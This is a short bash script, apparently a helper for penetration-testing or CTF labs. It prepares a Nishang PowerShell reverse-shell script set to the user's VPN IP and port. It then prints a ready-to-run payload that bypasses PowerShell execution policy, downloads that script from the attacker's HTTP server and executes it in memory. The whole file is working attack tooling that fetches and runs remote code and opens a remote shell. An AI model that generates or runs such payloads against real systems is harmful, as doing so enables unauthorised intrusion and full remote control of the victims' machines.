#!/bin/bash
port=4444
myip=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
server_port=80
while getopts i:p:s: flag
do
    case "${flag}" in
        i) myip=${OPTARG};;
        p) port=${OPTARG};;
		s) server_port=${OPTARG};;
    esac
done
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
printf "\nInvoke-PowerShellTcp -Reverse -IPAddress $myip -Port $port" >> Invoke-PowerShellTcp.ps1
echo "set up http server on port 80 and netcat listener on port $port"
echo "Your payload:"
echo "cmd /c powershell -InputFormat none -ExecutionPolicy Bypass -NoProfile -Command 'IEX(IWR http://$myip:$server_port/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'"
